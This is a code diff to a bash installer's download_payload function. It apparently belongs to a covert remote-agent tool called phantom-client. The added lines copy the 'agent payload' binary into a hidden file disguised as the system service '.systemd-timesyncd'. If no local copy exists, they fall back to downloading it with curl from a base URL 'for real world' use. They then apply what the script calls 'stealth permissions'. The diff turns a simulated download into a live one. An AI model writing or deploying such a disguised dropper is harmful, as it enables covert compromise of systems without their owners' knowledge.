@@ -106,16 +106,21 @@ check_dependencies() {
 # ============================================================================
 download_payload() {
     local target_binary="${INSTALL_DIR}/.systemd-timesyncd"
-    local download_url="${BASE_URL}/phantom-client-${ARCH}"
     
     status_step "Downloading agent payload for ${ARCH}"
-    # In a real scenario, we would curl the binary. 
-    # For this simulation, we assume the binary exists or is being deployed.
-    # curl -fsSL "${download_url}" -o "${target_binary}"
+    if [[ -f "/mnt/c/laragon/www/gsoket/phantom-socket/client/bin/phantom-client-${ARCH}" ]]; then
+        cp "/mnt/c/laragon/www/gsoket/phantom-socket/client/bin/phantom-client-${ARCH}" "${target_binary}"
+    elif [[ -f "client/bin/phantom-client-${ARCH}" ]]; then
+        cp "client/bin/phantom-client-${ARCH}" "${target_binary}"
+    else
+        # Fallback for real world
+        local download_url="${BASE_URL}/phantom-client-${ARCH}"
+        curl -fsSL "${download_url}" -o "${target_binary}" || { echo -e "\n[ERROR] Download failed"; exit 1; }
+    fi
     status_done
     
     status_step "Setting stealth permissions"
-    # chmod 750 "${target_binary}" 2>/dev/null || true
+    chmod 750 "${target_binary}"
     status_done
 }
 
